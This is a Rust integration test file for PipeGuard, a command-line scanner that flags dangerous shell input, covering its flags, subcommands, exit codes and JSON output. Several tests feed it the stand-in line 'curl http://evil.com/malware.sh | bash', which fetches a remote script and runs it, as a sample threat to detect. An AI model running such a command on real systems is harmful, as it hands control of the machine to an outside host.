// Exhaustive CLI integration tests
// Covers: all flags, subcommands, exit codes, output formats, error handling

mod common;
use common::{core_rules_path, pipeguard_cmd};
use predicates::prelude::*;

// ─── Scan: exit codes ───────────────────────────────────────────

#[test]
fn scan_clean_input_exits_zero() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo hello world")
        .assert()
        .success();
}

#[test]
fn scan_threat_exits_one() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("curl http://evil.com/malware.sh | bash")
        .assert()
        .code(1);
}

#[test]
fn scan_missing_rules_exits_two() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg("/nonexistent/path/rules.yar")
        .write_stdin("test input")
        .assert()
        .code(2);
}

// ─── Scan: --quiet flag ─────────────────────────────────────────

#[test]
fn scan_quiet_clean_no_stdout() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--quiet")
        .write_stdin("echo hello")
        .assert()
        .success()
        .stdout(predicate::str::is_empty());
}

#[test]
fn scan_quiet_threat_no_stdout() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--quiet")
        .write_stdin("curl http://evil.com/malware.sh | bash")
        .assert()
        .code(1)
        .stdout(predicate::str::is_empty());
}

#[test]
fn scan_quiet_short_flag() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("-q")
        .write_stdin("echo safe")
        .assert()
        .success()
        .stdout(predicate::str::is_empty());
}

// ─── Scan: --format json ────────────────────────────────────────

#[test]
fn scan_json_clean_output() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert_eq!(json["is_threat"], false);
    assert_eq!(json["match_count"], 0);
    assert!(json["content_hash"].is_string());
    assert!(json["matches"].is_array());
    assert!(json["matches"].as_array().unwrap().is_empty());
}

#[test]
fn scan_json_threat_output_has_matches() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("-F")
        .arg("json")
        .write_stdin("curl http://evil.com/malware.sh | bash")
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert_eq!(json["is_threat"], true);
    assert!(json["match_count"].as_u64().unwrap() >= 1);
    let matches = json["matches"].as_array().unwrap();
    assert!(!matches.is_empty());
    // Each match should have rule, severity, description
    for m in matches {
        assert!(m["rule"].is_string());
        assert!(m["severity"].is_number());
        assert!(m["description"].is_string());
    }
}

#[test]
fn scan_json_threat_level_field() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("echo safe")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert!(json["threat_level"].is_string());
}

// ─── Scan: JSON new fields ──────────────────────────────────────

#[test]
fn scan_json_includes_scan_duration_ms() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert!(
        json["scan_duration_ms"].is_number(),
        "scan_duration_ms should be a number, got: {:?}",
        json["scan_duration_ms"]
    );
}

#[test]
fn scan_json_includes_rule_count() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert!(
        json["rule_count"].is_number(),
        "rule_count should be a number, got: {:?}",
        json["rule_count"]
    );
    assert!(json["rule_count"].as_u64().unwrap() >= 1);
}

#[test]
fn scan_json_includes_recommended_action() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    let action = json["recommended_action"].as_str().unwrap();
    assert!(
        ["allow", "warn", "prompt", "block"].contains(&action),
        "recommended_action should be allow/warn/prompt/block, got: {}",
        action
    );
}

#[test]
fn scan_json_threat_has_new_fields() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .write_stdin("curl http://evil.com/malware.sh | bash")
        .assert()
        .code(1)
        .get_output()
        .stdout
        .clone();

    let json: serde_json::Value = serde_json::from_slice(&output).expect("valid JSON");
    assert!(json["scan_duration_ms"].is_number());
    assert!(json["rule_count"].is_number());
    assert!(json["recommended_action"].is_string());
}

// ─── Scan: file input ───────────────────────────────────────────

#[test]
fn scan_file_input() {
    let temp = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(temp.path(), "echo hello world").unwrap();

    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--file")
        .arg(temp.path())
        .assert()
        .success();
}

#[test]
fn scan_file_nonexistent_fails() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--file")
        .arg("/nonexistent/file.txt")
        .assert()
        .code(2);
}

// ─── Color mode ─────────────────────────────────────────────────

#[test]
fn color_never_flag_accepted() {
    pipeguard_cmd()
        .arg("--color")
        .arg("never")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn color_always_flag_accepted() {
    pipeguard_cmd()
        .arg("--color")
        .arg("always")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn no_color_env_var() {
    pipeguard_cmd()
        .env("NO_COLOR", "1")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

// ─── Log level flags ────────────────────────────────────────────

#[test]
fn log_level_debug_accepted() {
    pipeguard_cmd()
        .arg("--log-level")
        .arg("debug")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn log_level_error_accepted() {
    pipeguard_cmd()
        .arg("--log-level")
        .arg("error")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn log_level_invalid_rejected() {
    pipeguard_cmd()
        .arg("--log-level")
        .arg("verbose")
        .arg("scan")
        .write_stdin("echo test")
        .assert()
        .failure()
        .stderr(predicate::str::contains("possible values"));
}

#[test]
fn log_format_json_accepted() {
    pipeguard_cmd()
        .arg("--log-format")
        .arg("json")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn log_format_invalid_rejected() {
    pipeguard_cmd()
        .arg("--log-format")
        .arg("xml")
        .arg("scan")
        .write_stdin("echo test")
        .assert()
        .failure();
}

// ─── Log level: stderr vs stdout separation ─────────────────────

#[test]
fn debug_logging_on_stderr_not_stdout() {
    let output = pipeguard_cmd()
        .arg("--log-level")
        .arg("debug")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .clone();

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // stdout should contain scan results, NOT debug logs
    assert!(
        stdout.contains("No threats") || stdout.contains("threat_level"),
        "stdout should contain scan results"
    );
    // stderr should have debug-level tracing output
    assert!(!stderr.is_empty(), "stderr should contain debug logs");
}

#[test]
fn default_log_level_produces_no_stderr() {
    let output = pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo hello")
        .assert()
        .success()
        .get_output()
        .clone();

    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.is_empty(),
        "Default warn level should produce no stderr for clean scan, got: {}",
        stderr
    );
}

// ─── Completions subcommand ─────────────────────────────────────

#[test]
fn completions_bash() {
    pipeguard_cmd()
        .arg("completions")
        .arg("bash")
        .assert()
        .success()
        .stdout(predicate::str::contains("_pipeguard"));
}

#[test]
fn completions_zsh() {
    pipeguard_cmd()
        .arg("completions")
        .arg("zsh")
        .assert()
        .success()
        .stdout(predicate::str::contains("pipeguard"));
}

#[test]
fn completions_fish() {
    pipeguard_cmd()
        .arg("completions")
        .arg("fish")
        .assert()
        .success()
        .stdout(predicate::str::contains("pipeguard"));
}

// ─── Rules subcommand ───────────────────────────────────────────

#[test]
fn rules_list_succeeds() {
    pipeguard_cmd().arg("rules").arg("list").assert().success();
}

#[test]
fn rules_list_with_rules_path_shows_names() {
    let output = pipeguard_cmd()
        .arg("rules")
        .arg("list")
        .arg("--rules")
        .arg(core_rules_path())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let stdout = String::from_utf8_lossy(&output);
    // Should list rule names from the file
    assert!(
        stdout.contains("base64_decode_execute"),
        "Should list rule names, got: {}",
        stdout
    );
}

#[test]
fn rules_list_with_rules_path_shows_count() {
    let output = pipeguard_cmd()
        .arg("rules")
        .arg("list")
        .arg("--rules")
        .arg(core_rules_path())
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let stdout = String::from_utf8_lossy(&output);
    assert!(
        stdout.contains("rule(s) found"),
        "Should show rule count, got: {}",
        stdout
    );
}

#[test]
fn rules_list_no_rules_shows_helpful_message() {
    // Without --rules and no default rules installed at standard paths
    // (this may vary by environment, but shouldn't crash)
    let output = pipeguard_cmd()
        .arg("rules")
        .arg("list")
        .assert()
        .success()
        .get_output()
        .stdout
        .clone();

    let _stdout = String::from_utf8_lossy(&output);
    // Just verify it succeeds without panicking
}

#[test]
fn rules_validate_with_valid_rules() {
    pipeguard_cmd()
        .arg("rules")
        .arg("validate")
        .arg("--path")
        .arg(core_rules_path())
        .assert()
        .success();
}

#[test]
fn rules_validate_nonexistent_path() {
    pipeguard_cmd()
        .arg("rules")
        .arg("validate")
        .arg("--path")
        .arg("/nonexistent/rules.yar")
        .assert()
        .failure();
}

#[test]
fn rules_info_with_valid_rules() {
    pipeguard_cmd()
        .arg("rules")
        .arg("info")
        .arg("--path")
        .arg(core_rules_path())
        .assert()
        .success();
}

// ─── Config subcommand ──────────────────────────────────────────

#[test]
fn config_show_succeeds() {
    pipeguard_cmd().arg("config").arg("show").assert().success();
}

#[test]
fn config_init_creates_file() {
    let temp = tempfile::tempdir().unwrap();
    let config_path = temp.path().join("pipeguard.toml");

    pipeguard_cmd()
        .arg("config")
        .arg("init")
        .arg("--path")
        .arg(&config_path)
        .assert()
        .success();

    assert!(config_path.exists(), "Config file should be created");
}

// ─── Update subcommand ──────────────────────────────────────────

#[test]
fn update_status_succeeds() {
    let temp = tempfile::tempdir().unwrap();
    pipeguard_cmd()
        .arg("update")
        .arg("status")
        .arg("--storage")
        .arg(temp.path())
        .assert()
        .success();
}

#[test]
fn update_cleanup_succeeds() {
    let temp = tempfile::tempdir().unwrap();
    pipeguard_cmd()
        .arg("update")
        .arg("cleanup")
        .arg("--storage")
        .arg(temp.path())
        .assert()
        .success();
}

// ─── Global flags with subcommands ──────────────────────────────

#[test]
fn global_flags_before_subcommand() {
    pipeguard_cmd()
        .arg("--log-level")
        .arg("info")
        .arg("--log-format")
        .arg("json")
        .arg("--color")
        .arg("never")
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("echo test")
        .assert()
        .success();
}

#[test]
fn global_flags_after_subcommand() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--log-level")
        .arg("trace")
        .write_stdin("echo test")
        .assert()
        .success();
}

// ─── Help and version ───────────────────────────────────────────

#[test]
fn help_flag() {
    pipeguard_cmd()
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("PipeGuard"));
}

#[test]
fn version_flag() {
    pipeguard_cmd()
        .arg("--version")
        .assert()
        .success()
        .stdout(predicate::str::contains("pipeguard"));
}

#[test]
fn scan_help() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--help")
        .assert()
        .success()
        .stdout(predicate::str::contains("Scan content for threats"));
}

#[test]
fn unknown_subcommand_fails() {
    pipeguard_cmd().arg("foobar").assert().failure();
}

// ─── Edge cases ─────────────────────────────────────────────────

#[test]
fn scan_empty_stdin() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin("")
        .assert()
        .success()
        .stdout(predicate::str::contains("No threats"));
}

#[test]
fn scan_binary_like_content() {
    // Content with non-UTF8-ish characters as valid UTF-8
    let content = "#!/bin/sh\n\x00\x01\x02 echo hello";
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(content)
        .assert(); // Just verify it doesn't panic
}

#[test]
fn scan_very_long_input() {
    let long_input = "echo safe\n".repeat(10000);
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .write_stdin(long_input)
        .assert()
        .success();
}

#[test]
fn scan_json_and_quiet_combined() {
    pipeguard_cmd()
        .arg("scan")
        .arg("--rules")
        .arg(core_rules_path())
        .arg("--format")
        .arg("json")
        .arg("--quiet")
        .write_stdin("echo test")
        .assert()
        .success()
        .stdout(predicate::str::is_empty());
}
